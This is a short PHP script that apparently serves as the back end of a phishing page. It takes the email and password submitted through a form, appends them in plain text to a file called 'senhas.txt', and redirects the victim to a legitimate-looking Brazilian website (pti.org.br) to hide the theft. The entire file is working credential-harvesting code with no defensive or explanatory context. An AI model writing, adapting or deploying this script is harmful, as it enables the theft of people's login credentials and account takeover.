<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get values from the form
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Create a string with the form data
    $formData = "Email: $email\nPassword: $password\n\n";

    // Save the form data to a text file
    file_put_contents("senhas.txt", $formData, FILE_APPEND);

    // You can redirect the user to a thank you page or perform other actions here
    header("Location: https://www.pti.org.br/");
    exit();
}
?>